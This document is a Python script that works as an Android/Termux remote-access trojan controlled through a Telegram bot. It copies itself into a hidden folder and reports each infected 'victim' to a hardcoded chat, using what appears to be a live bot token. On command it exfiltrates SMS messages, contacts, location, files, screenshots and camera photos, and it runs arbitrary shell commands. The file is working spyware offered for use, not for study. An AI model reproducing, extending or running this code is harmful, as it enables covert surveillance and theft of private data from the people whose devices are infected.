import os
import telebot
import subprocess
import time
import shutil
import platform
from datetime import datetime

# ============= إعدادات البوت =============
TOKEN = "7809435528:AAH8YBYilD_LJz63CrC_NUgmRQff3ohFhWE"
CHAT_ID = 8172308538  # ضع معرفك على تيليجرام
bot = telebot.TeleBot(TOKEN)

# ============= زرع السكربت في مجلد مخفي =============
target_path = "/storage/emulated/0/.Hamo_VIP666/"
if not os.path.exists(target_path):
    os.makedirs(target_path)

myself = os.path.abspath(__file__)
hidden_path = os.path.join(target_path, "system_hamo.py")

if myself != hidden_path:
    shutil.copy(myself, hidden_path)

# ============= شعار عند التشغيل =============
banner = """
👑 HAMO_VIP666 HAS INFECTED YOUR DEVICE 👑
😈 Powered by Termux Control 😈
"""

try:
    bot.send_message(CHAT_ID, f"{banner}\n💀 Victim Online: {platform.node()} - {datetime.now().strftime('%H:%M:%S')}")
except:
    pass

# ============= أوامر التحكم =============
@bot.message_handler(func=lambda message: True)
def command_handler(message):
    try:
        text = message.text.lower()
        output = ""

        if text == "ls":
            output = subprocess.getoutput("ls")

        elif text.startswith("cd "):
            os.chdir(text[3:])
            output = f"📁 Changed directory to: {text[3:]}"

        elif text == "whoami":
            output = subprocess.getoutput("whoami")

        elif text == "screen":
            img_path = "/sdcard/screen.png"
            os.system(f"screencap -p {img_path}")
            with open(img_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            output = "📸 Screenshot sent."

        elif text == "battery":
            output = subprocess.getoutput("termux-battery-status")

        elif text == "vibrate":
            os.system("termux-vibrate -d 500")
            output = "📳 Vibrated for 0.5 sec."

        elif text == "location":
            output = subprocess.getoutput("termux-location")

        elif text == "contacts":
            output = subprocess.getoutput("termux-contact-list")

        elif text == "storage":
            output = subprocess.getoutput("df -h")

        elif text == "apps":
            output = subprocess.getoutput("pm list packages")

        elif text == "smslist":
            output = subprocess.getoutput("termux-sms-list")

        elif text == "camera":
            photo_path = "/sdcard/cam.jpg"
            os.system(f"termux-camera-photo -c 0 {photo_path}")
            with open(photo_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            output = "📸 Camera photo sent."

        elif text.startswith("toast "):
            msg = text[6:]
            os.system(f"termux-toast '{msg}'")
            output = f"🔔 Toast message sent: {msg}"

        elif text == "popup":
            os.system("termux-toast '🔥 YOU HAVE BEEN HACKED BY HAMO_VIP666 🔥'")
            output = "💀 Fake popup sent."

        elif text.startswith("download "):
            path = text.split(" ", 1)[1]
            if os.path.exists(path):
                with open(path, "rb") as f:
                    bot.send_document(message.chat.id, f)
                output = f"✅ File sent: {path}"
            else:
                output = "❌ File not found."

        elif text.startswith("exec "):
            cmd = text[5:]
            output = subprocess.getoutput(cmd)

        elif text == "exit":
            output = "👋 Exiting script..."
            bot.send_message(message.chat.id, output)
            exit()

        else:
            output = "❓ Unknown command."

        bot.send_message(message.chat.id, output)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

# ============= تشغيل دائم =============
while True:
    try:
        bot.polling(none_stop=True)
    except:
        time.sleep(10)
